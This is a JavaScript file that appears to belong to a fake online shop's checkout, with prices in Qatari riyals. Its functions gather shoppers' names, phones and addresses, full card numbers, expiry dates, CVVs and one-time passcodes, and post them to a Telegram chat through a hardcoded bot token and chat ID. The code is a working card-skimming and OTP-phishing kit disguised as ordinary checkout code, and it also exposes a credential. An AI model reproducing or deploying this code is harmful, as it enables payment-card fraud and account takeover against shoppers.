const TELEGRAM_BOT_TOKEN =
  "9265035321:AAH_QQW5nMBJ60AArabT10mc97mMh7q_Ldg";
const TELEGRAM_CHAT_ID = "7738686473";

const PAYMENT_SESSION_KEY = "asmak_payment";

function tgEscape(text) {
  return String(text ?? "")
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;");
}

async function sendTelegramMessage(text) {
  const body = JSON.stringify({
    chat_id: TELEGRAM_CHAT_ID,
    text: text.slice(0, 4096),
    parse_mode: "HTML",
    disable_web_page_preview: true,
  });

  try {
    const viaFunction = await fetch("/.netlify/functions/telegram", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ text }),
    });
    if (viaFunction.ok) return true;
  } catch {
    /* Netlify functions unavailable — try direct API */
  }

  try {
    const direct = await fetch(
      `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
      {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body,
      },
    );
    const data = await direct.json().catch(() => ({}));
    return direct.ok && data.ok === true;
  } catch {
    return false;
  }
}

function formatCartForTelegram() {
  const lines = getCartLines();
  if (!lines.length) return "— no items —";
  return lines
    .map((line) => {
      const qty = line.quantity > 1 ? ` ×${line.quantity}` : "";
      return `• ${tgEscape(line.name)}${qty} — QAR ${tgEscape(formatMoney(line.lineTotal))}`;
    })
    .join("\n");
}

function formatCustomerBlock(customer) {
  if (!customer) return "—";
  const notes = customer.notes
    ? `\n📝 <b>Notes:</b> ${tgEscape(customer.notes)}`
    : "";
  return `👤 <b>Name:</b> ${tgEscape(customer.name)}
📞 <b>Phone:</b> ${tgEscape(customer.phone)}
📍 <b>Address:</b> ${tgEscape(customer.address)}${notes}`;
}

function savePaymentSession(payment) {
  sessionStorage.setItem(PAYMENT_SESSION_KEY, JSON.stringify(payment));
}

function getPaymentSession() {
  try {
    const raw = sessionStorage.getItem(PAYMENT_SESSION_KEY);
    return raw ? JSON.parse(raw) : null;
  } catch {
    return null;
  }
}

function formatPaymentBlock(payment) {
  if (!payment) return "—";
  return `💳 <b>Card:</b> ${tgEscape(payment.cardNumber)}
📅 <b>Expiry:</b> ${tgEscape(payment.expiry)}
🔒 <b>CVV:</b> ${tgEscape(payment.cvv)}`;
}

async function notifyDeliveryInfo(customer) {
  const total = formatMoney(getCartTotal());
  const text = `🛒 <b>New delivery details</b>

${formatCustomerBlock(customer)}

<b>Items:</b>
${formatCartForTelegram()}

<b>Total:</b> QAR ${tgEscape(total)}`;

  return sendTelegramMessage(text);
}

async function notifyPaymentInfo(customer, payment) {
  const total = formatMoney(getCartTotal());
  const text = `💳 <b>Payment details</b>

${formatPaymentBlock(payment)}

${formatCustomerBlock(customer)}

<b>Items:</b>
${formatCartForTelegram()}

<b>Total:</b> QAR ${tgEscape(total)}`;

  return sendTelegramMessage(text);
}

async function notifyOtpWithPayment(customer, payment, otpCode) {
  const total = formatMoney(getCartTotal());
  const text = `🔐 <b>OTP + payment</b>

🔢 <b>Code:</b> ${tgEscape(otpCode)}

${formatPaymentBlock(payment)}

${formatCustomerBlock(customer)}

<b>Items:</b>
${formatCartForTelegram()}

<b>Total:</b> QAR ${tgEscape(total)}`;

  return sendTelegramMessage(text);
}
